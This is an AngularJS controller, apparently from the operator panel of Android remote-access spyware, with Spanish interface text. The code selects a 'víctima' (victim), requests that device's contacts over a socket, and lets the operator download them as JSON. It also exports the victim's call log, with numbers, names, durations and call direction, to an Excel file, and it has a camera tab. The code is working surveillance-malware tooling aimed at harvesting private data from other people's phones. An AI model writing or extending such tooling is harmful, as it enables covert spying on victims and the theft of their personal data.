angular.module('myappy').controller('LabCtrl', ['$scope', '$rootScope', '$location', function ($scope, $rootScope, $location) {
    $scope.logs = [];
    $scope.barLimit = 100;
    $scope.labTab = $scope.labTab || 'camera';

    // Contacts
    $scope.contactsList = [];
    $scope.contactsSize = 0;
    $scope.contactsError = null;

    $scope.getContactsList = function() {
        $scope.contactsList = [];
        $scope.contactsSize = 0;
        $scope.contactsError = null;

        if (!$scope.selectedVictim) {
            $scope.contactsError = "No hay víctima seleccionada.";
            return;
        }

        socket.emit('get-contacts', { victimId: $scope.selectedVictim.id });

        socket.once('contacts-data', function(data) {
            $scope.$apply(function() {
                try {
                    let obj = typeof data === "string" ? JSON.parse(data) : data;
                    if (obj.contactsList && Array.isArray(obj.contactsList)) {
                        $scope.contactsList = obj.contactsList;
                        $scope.contactsSize = obj.contactsList.length;
                        $scope.contactsError = null;
                    } else {
                        $scope.contactsList = [];
                        $scope.contactsSize = 0;
                        $scope.contactsError = obj.error || "No se recibieron contactos";
                    }
                } catch(e) {
                    $scope.contactsList = [];
                    $scope.contactsSize = 0;
                    $scope.contactsError = "Error procesando los datos de contactos";
                }
            });
        });
    };

    $scope.saveContacts = function() {
        if (!$scope.contactsList || !$scope.contactsList.length) return;
        const blob = new Blob([JSON.stringify($scope.contactsList, null, 2)], {type:'application/json'});
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = "contacts.json";
        link.click();
    };

    $scope.$watch('labTab', function(newTab) {
        if (newTab === 'contacts') {
            $scope.getContactsList();
        }
    });

    $scope.close = function () {
        if ($scope.$parent.closeLab) {
            $scope.$parent.closeLab();
        }
    };

    $scope.goToPage = function (page) {
        $location.path('/' + page);
    };

    $scope.addLog = function (msg, color) {
        $scope.logs.push({
            date: new Date().toLocaleString(),
            msg: msg,
            color: color || '#222'
        });
        var logDiv = document.getElementById("logy");
        if (logDiv) {
            logDiv.scrollTop = logDiv.scrollHeight;
        }
    };

    $scope.increaseLimit = function() {
        if ($scope.callsList && $scope.barLimit < $scope.callsList.length) {
            $scope.barLimit += 50;
        }
    };

    $scope.exportCallsToExcel = function() {
        if (!$scope.callsList || !$scope.callsList.length) return;
        var data = $scope.callsList.map(function(call) {
            return {
                'No. Teléfono': call.phoneNo || '',
                'Nombre': call.name || 'Unknown',
                'Duración': call.duration || '',
                'Tipo': call.type == 1 ? 'INCOMING' : 'OUTGOING'
            };
        });
        var ws = XLSX.utils.json_to_sheet(data);
        var wb = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wb, ws, "Llamadas");
        XLSX.writeFile(wb, "registro_llamadas.xlsx");
    };
}]);